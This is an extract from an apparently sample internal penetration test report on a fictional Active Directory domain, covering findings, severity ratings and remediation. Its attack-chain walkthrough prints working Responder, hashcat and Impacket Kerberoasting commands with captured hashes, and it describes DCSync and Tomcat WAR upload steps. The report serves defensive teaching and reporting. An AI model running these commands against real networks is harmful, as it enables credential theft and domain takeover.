(“Inlanefreight” herein) contracted Hack The Box Academy to perform a Network Penetration Test of Inlanefreight’s internally facing network to identify security weaknesses, determine the impact to Inlanefreight, document all findings in a clear and repeatable manner, and provide remediation recommendations. Approach Hack The Box Academy performed testing under a “black box” approach May 12, 2022, to May 31, 2022 without credentials or any advance knowledge of Inlanefreight’s internally facing environment with the goal of identifying unknown weaknesses. Testing was performed from a non-evasive standpoint with the goal of uncovering as many misconfigurations and vulnerabilities as possible. Testing was performed remotely via a host that was provisioned specifically for this assessment. Each weakness identified was documented and manually investigated to determine exploitation possibilities and escalation potential. Hack The Box Academy sought to demonstrate the full impact of every vulnerability, up to and including internal domain compromise. If Hack The Box Academy were able to gain a foothold in the internal network, Inlanefreight allowed for further testing including lateral movement and horizontal/vertical privilege escalation to demonstrate the impact of an internal network compromise. 5\nScope The scope of this assessment was one internal network range and the INLANEFREIGHT.LOCAL Active Directory domain. In-Scope Assets Host/URL/IP Address Description 192.168.195.0/24 Inlanefreight internal network Table 1: Scope Details Assessment Overview and Recommendations During the internal penetration test against Inlanefreight, Hack The Box Academy identified seven (7) findings that threaten the confidentiality, integrity, and availability of Inlanefreight’s information systems. The findings were categorized by severity level, with five (5) of the findings being assigned a high-risk rating, one (1) medium-risk, and one (1) low risk. There was also one (1) informational finding related to enhancing security monitoring capabilities within the internal network. The tester found Inlanefreight’s patch and vulnerability management to be well-maintained. None of the findings in this report were related to missing operating system or third-party patches of known vulnerabilities in services and applications that could result in unauthorized access and system compromise. Each flaw discovered during testing was related to a misconfiguration or lack of hardening, with most falling under the categories of weak authentication and weak authorization. One finding involved a network communication protocol that can be “spoofed” to retrieve passwords for internal users that can be used to gain unauthorized access if an attacker can gain unauthorized access to the network without credentials. In most corporate environments, this protocol is unnecessary and can be disabled. It is enabled by default primarily for small and medium sized businesses that do not have the resources for a dedicated hostname resolution (the “phonebook” of your network) server. During the assessment, the presence of these resources was observed on the network, so Inlanefreight should begin formulating a test plan to disable the dangerous service. The next issue was a weak configuration involving service accounts that allows any authenticated user to steal a component of the authentication process that can often be guessed offline (via password “cracking”) to reveal the human-readable form of the account’s password. These types of service accounts typically have more privileges than a standard user, so obtaining one of their passwords in clear text could result in lateral movement or privilege escalation and eventually in complete internal network compromise. The tester also noticed that the same password was used for administrator access to all servers within the internal network. This means that if one server is compromised, an attacker can re-use this password to access any server that shares it for administrative access. Fortunately, both issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users. A webserver was also found to be running a web application that used weak and easily guessable credentials to access an administrative console that can be leveraged to gain unauthorized access to the underlying server. This could be exploited by an attacker on the internal network without needing a valid user account. This attack is very well- documented, so it is an exceedingly likely target can be particularly damaging, even in the hands of an unskilled attacker. Ideally, direct external access to this service would be disabled, but if it cannot be, it should be reconfigured with exceptionally strong credentials that are rotated frequently. Inlanefreight may also want to consider maximizing the log data collected from this device to ensure that attacks against it can be detected and triaged quickly. 6\nThe tester also found shared folders with excessive permissions, meaning that all users in the internal network can access a considerable amount of data. While sharing files internally between departments and users is important to day-to-day business operations, wide open permissions on file shares may result in unintentional disclosure of confidential information. Even if a file share does not contain any sensitive information today, someone may unwittingly put such data there thinking it is protected when it isn’t. This configuration should be changed to ensure that users can access only what is necessary to perform their day-to-day duties. Finally, the tester noticed that testing activities seemed to go mostly unnoticed, which may represent an opportunity to improve visibility into the internal network and indicates that a real-world attacker might remain undetected if internal access is achieved. Inlanefreight should create a remediation plan based on the Remediation Summary section of this report, addressing all high findings as soon as possible according to the needs of the business. Inlanefreight should also consider performing periodic vulnerability assessments if they are not already being performed. Once the issues identified in this report have been addressed, a more collaborative, in-depth Active Directory security assessment may help identify additional opportunities to harden the Active Directory environment, making it more difficult for attackers to move around the network and increasing the likelihood that Inlanefreight will be able to detect and respond to suspicious activity. 7\nNetwork Penetration Test Assessment Summary Hack The Box Academy began all testing activities from the perspective of an unauthenticated user on the internal network. Inlanefreight provided the tester with network ranges but did not provide additional information such as operating system or configuration information. Summary of Findings During the course of testing, Hack The Box Academy uncovered a total of seven (7) findings that pose a material risk to Inlanefreight’s information systems. Hack The Box Academy also identified one informational finding that, if addressed, could further strengthen Inlanefreight’s overall security posture. Informational findings are observations for areas of improvement by the organization and do not represent security vulnerabilities on their own. The below table provides a summary of the findings by severity level. Finding Severity High Medium Low Total 5 1 1 7 Table 2: Severity Summary Below is a high-level overview of each finding identified during testing. These findings are covered in depth in the Technical Findings Details section of this report. Finding # Severity Level Finding Name 1. High LLMNR/NBT-NS Response Spoofing 2.

The steps below demonstrate the steps taken from initial access to compromise and does not include all vulnerabilities and misconfigurations discovered during the course of testing. Any issues not used as part of the path to compromise are listed as separate, standalone issues in the Technical Findings Details section, ranked by severity level. The intent of this attack chain is to demonstrate to Inlanefreight the impact of each vulnerability shown in this report and how they fit together to demonstrate the overall risk to the client environment and help to prioritize remediation efforts (i.e., patching two flaws quickly could break up the attack chain while the company works to remediate all issues reported). While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken by the tester to achieve domain compromise. Detailed Walkthrough Hack The Box Academy performed the following to fully compromise the INLANEFREIGHT.LOCAL domain. 1. The tester utilized the Responder tool to obtain an NTLMv2 password hash for a domain user, bsmith. 2. This password hash was successfully cracked offline using the Hashcat tool to reveal the user's clear text password which granted a foothold into the INLANEFREIGHT.LOCAL domain, but with no more privileges than a standard domain user. 3. The tester then ran the BloodHound.py, a Python version of the popular SharpHound collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain. 4. The tester was able to successfully crack this account's password offline, revealing the clear text value. 5. The tester was able to authenticate to the host SQL01.INLANEFREIGHT.LOCAL and retrieve a clear text password from the host's registry by decrypting LSA secrets for an account (srvadmin) which was set up for autologon. 6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain so the tester was able to log into the MS01.INLANEFREIGHT.LOCAL host and retrieve a Kerberos TGT ticket for a logged in user, pramirez, who was part of the Tier I Server Admins group which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket. 7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the- Ticket attack to authenticate as this user. 8. Finally, the tester was able to perform a DCSync attack after successfully authenticating with this user account via the Mimikatz tool which ended in domain compromise. 9\nDetailed reproduction steps for this attack chain are as follows: Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the bsmith user by spoofing NBT-NS/LLMNR traffic on the local network segment. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FA AA50000000002000800330042004B005A0001001E00570049004E002D0054005700570058005400470044003900340043005600040034 00570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D80106000400020000000800300030000000000000000100000000 2000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A0010000000000000000000000000000000000 00900280063006900660073002F003100390032002E003100360038002E003100390035002E0031003600380000000000000000000000 0000 <SNIP> Figure 1: Retrieving Password Hash with Responder The tester was able to "crack" this password hash offline using the Hashcat tool and retrieve the clear text password value, thus granting a foothold to enumerate the Active Directory domain. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 2: Cracking Password Hash with Hashcat The tester proceeded to enumerate user accounts configured with Service Principal Names (SPNs) that may be subject to a Kerberoasting attack, a lateral movement/privilege escalation technique that targets SPNs which are unique identifiers that Kerberos uses to map a service instance to a service account. Any domain user can request a Kerberos ticket for any service account in the domain and the ticket is encrypted with the service account's NTLM password hash, which can potentially be "cracked" offline to reveal the account's clear text password value. 10\n$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------------- --------- -------- -------------------------- --------- ---- ------ MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> MSSQLSvc/SQL02.inlanefreight.local:1433 sqlprod 2022-05-13 16:54:52.889815 <never> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev 2022-05-13 16:54:57.905315 <never> MSSQLSvc/QA001.inlanefreight.local:1433 sqlqa 2022-05-13 16:55:03.421004 <never> backupjob/veam001.inlanefreight.local backupjob 2022-05-13 18:38:17.740269 <never> vmware/vc.inlanefreight.local vmwaresvc 2022-05-13 18:39:10.691799 <never> Figure 3: Listing SPN Accounts with GetUserSPNs.py The tester then ran the Python version of the popular BloodHound Active Directory enumeration tool to collect information such as users, groups, computers, ACLs, group membership, user and computer properties, user sessions, local admin access, and more.

Remediation efforts are prioritized below starting with those that will likely take the least amount of time and effort to complete. Inlanefreight should ensure that all remediation steps and mitigating controls are carefully planned and tested to prevent any service disruptions or loss of data. Short Term  [Finding 2] – Set strong (24+ character) passwords on all SPN accounts  [Finding 5] – Change the default admin credentials for the Tomcat Manager  [Finding 7] – Disable Directory Listing on the affected web server  Enforce a password change for all users because of the domain compromise Medium Term  [Finding 1] – Disable LLMNR and NBT-NS wherever possible  [Finding 2] – Transition from SPNs to Group Managed Service Accounts (gMSA) wherever possible  [Finding 3] – Implement a solution such as the Microsoft Local Administrator Password Solution" (LAPS)  [Finding 4] – Enhance the domain password policy  [Finding 4] – Consider implementing an enterprise password manager  [Finding 5] – Consider limiting access to the Tomcat Manager to localhost or specific IP Addresses  [Finding 6] – Perform a network file share audit  [Finding 8] – Enhance network logging and monitoring  [Finding 8] – Implement an enterprise endpoint detection & response solution Long Term  Perform ongoing internal network vulnerability assessments and domain password audits  Perform periodic Active Directory security assessments  Educate systems and network administrators and developers on security hardening best practices compromise  Enhance network segmentation to isolate critical hosts and limit the effects of an internal compromise 17\nTechnical Findings Details 1. LLMNR/NBT-NS Response Spoofing - High CWE CWE-522 CVSS 3.1 Score 9.5 By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary-controlled system. This activity may be used to collect or relay authentication materials. Description (Incl. Root Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Cause) Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary-controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary-controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack Security Impact the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary- controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system relay step can happen in conjunction with poisoning but may also be independent of it. Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. Affected Domain  INLANEFREIGHT.LOCAL  Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment  Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks. Remediation  Network intrusion detection and prevention systems that can identify traffic patterns indicative of MiTM activity can be used to mitigate activity at the network level.  Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of MiTM activity.

Weak Kerberos Authentication (“Kerberoasting”) - High CWE CWE-522 CVSS 3.1 Score 9.5 In an Active Directory (AD) environment, Service Principal Names (SPNs) are used to uniquely identify instances of a Windows service. Kerberos authentication requires that each SPN be associated with one service account (Active Directory user account). Any authenticated AD user can request one or more Kerberos Ticket-Granting Service (TGS) tickets from the domain Description (Incl. Root controller for any SPN accounts. These tickets are encrypted with the associated AD account’s Cause) NTLM password hash. They can be brute forced offline using a password cracking tool such as Hashcat if a weak password is used along with the RC4 encryption algorithm. If AES encryption is in use, it will take more resources to “crack” a ticket to reveal the account’s clear-text password, but it is possible if weak passwords are in use. A successful Kerberoasting attack along with cracked passwords could lead to lateral movement and privilege escalation in an AD environment. If a password is cracked for a Security Impact Domain Administrator account or equivalent, an attacker could gain control over most, if not all, resources in the domain. Affected Domain  INLANEFREIGHT.LOCAL Where possible eliminate SPNs in the environment in favor of Group Managed Service Accounts (gMSA) which are not subject to this type of attack. If migration to gMSAs is not possible the following steps will help mitigate the risk of this attack: Remediation  Enable AES Kerberos encryption instead of RC4  Use strong 25+ character passwords for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------------- --------- -------- -------------------------- --------- ---- ------ MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> MSSQLSvc/SQL02.inlanefreight.local:1433 sqlprod 2022-05-13 16:54:52.889815 <never> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev 2022-05-13 16:54:57.905315 <never> MSSQLSvc/QA001.inlanefreight.local:1433 sqlqa 2022-05-13 16:55:03.421004 <never> backupjob/veam001.inlanefreight.local backupjob 2022-05-13 18:38:17.740269 <never> vmware/vc.inlanefreight.local vmwaresvc 2022-05-13 18:39:10.691799 <never> Figure 20: Kerberoasting - Listing SPN Accounts 20\nTargeted Kerberoasting against the mssqlsvc account using the GetUserSPNs.py tool. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------- -------- -------- -------------------------- --------- --------- - MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a39 88485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c 782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3 c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c4 4ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf6828 6ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a8971 85716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP> Figure 21: Targeted Kerberoasting 21\n3.

Root An Apache Tomcat Server was found that was exposing the Tomcat Manager login URL and Cause) using weak/default credentials to enter the Manager (admin) backend. An attacker who gains access to the Tomcat Manager area can upload a malicious application via a WAR file containing custom JSP code. This code can be used to run arbitrary commands on the underlying server in the context of the service account that the Apache Tomcat instance Security Impact runs under. This Tomcat instance was running under a local service account assigned privileges that can be leveraged to escalate to the all-powerful NT AUTHORITY\SYSTEM account and gain complete control over the server, potentially gaining access to credentials and other sensitive data. Affected Host(s)  192.168.195.205 (8080/TCP)  Restrict access to the Tomcat Manager URL to either localhost or only select IP addresses if this URL does need to be accessed remotely by administrators.  Change the default administrator account name to something unique and set a strong, Remediation randomized password that does not appear in any wordlists as the Tomcat Manager page uses Basic Authentication, which has no inherent protections against password brute-forcing attacks.

Directory Listing Enabled - Low CWE CWE-548 CVSS 3.1 Score 4.3 Description (Incl. Root The web application exposes a directory listing of some files in the web root and subfolders. Cause) The severity of this finding depends on the sensitivity of the files exposed on the web server. If the directory exposes only files intended for public consumption, then the risk is lower but if Security Impact an attacker can gain access to sensitive information such as configuration files, they may be able to use these to gain further access to the application or web server.

Root It appeared that Inlanefreight did not notice “noisy” activities during the course of testing. The Cause) tester was also not blocked when using standard open-source penetration testing tools. If network and endpoint detection and response are inadequate, an attacker who can gain a Security Impact foothold in the internal network may be able to move laterally, perform post-exploitation, and achieve persistence easily. Consider investing in a more advanced network monitoring solution, configuring logging on all hosts, and processing them for anomalies using a SIEM tool, and implementing endpoint detection on each server and workstation that is more difficult to bypass and tamper with. The Remediation organization should not rely on endpoint protection alone. When combined with a defense-in- depth security strategy, they can be an excellent tool for detecting an attacker who gains internal network access and is forced to perform “noisier” and riskier activities to the nature of the hardened environment.

The rating is based off of an assessment of the priority with which each finding should be viewed and the potential impact each has on the confidentiality, integrity, and availability of Inlanefreight’s data. Rating Severity Rating Definition Exploitation of the technical or procedural vulnerability will cause substantial harm. Significant political, financial, and/or legal damage is likely to result. The threat exposure is high, thereby increasing the likelihood of High occurrence. Security controls are not effectively implemented to reduce the severity of impact if the vulnerability were exploited. Exploitation of the technical or procedural vulnerability will significantly impact the confidentiality, integrity, and/or availability of the system, application, or data. Exploitation of the vulnerability may cause moderate financial loss or public embarrassment. The threat exposure is moderate-to-high, thereby increasing the likelihood of occurrence. Security controls are in place to contain the severity of impact if the vulnerability were Medium exploited, such that further political, financial, or legal damage will not occur. - OR - The vulnerability is such that it would otherwise be considered High Risk, but the threat exposure is so limited that the likelihood of occurrence is minimal. Exploitation of the technical or procedural vulnerability will cause minimal impact to operations. The Confidentiality, Integrity and Availability (CIA) of sensitive information are not at risk of compromise. Exploitation of the vulnerability may cause slight financial loss or public embarrassment. The threat exposure is moderate-to-low. Security controls are in place to contain the severity of impact if the vulnerability were Low exploited, such that further political, financial, or legal damage will not occur. - OR - The vulnerability is such that it would otherwise be considered Medium Risk, but the threat exposure is so limited that the likelihood of occurrence is minimal.
